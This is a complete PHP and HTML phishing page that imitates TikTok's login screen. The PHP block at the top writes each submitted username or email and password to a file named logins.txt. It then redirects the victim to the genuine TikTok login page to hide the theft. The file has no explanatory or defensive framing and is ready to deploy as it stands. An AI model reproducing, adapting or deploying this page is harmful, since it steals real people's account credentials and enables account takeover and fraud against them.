<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $file = fopen("logins.txt", "a");
    fwrite($file, "TikTok | Username: " . $_POST["email"] . " | Password: " . $_POST["password"] . "\n");
    fclose($file);
    header("Location: https://www.tiktok.com/login");
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>TikTok - Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #000;
            color: white;
        }
        .container {
            width: 300px;
            margin: 100px auto;
            padding: 20px;
            background: #1c1c1c;
            border-radius: 8px;
        }
        input, button {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
        }
        button {
            background: #ff0050;
            border: none;
            color: white;
            font-size: 16px;
        }
        button:hover {
            background: #d40040;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>TikTok Login</h2>
        <form method="POST">
            <input type="text" name="email" placeholder="Username or Email" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
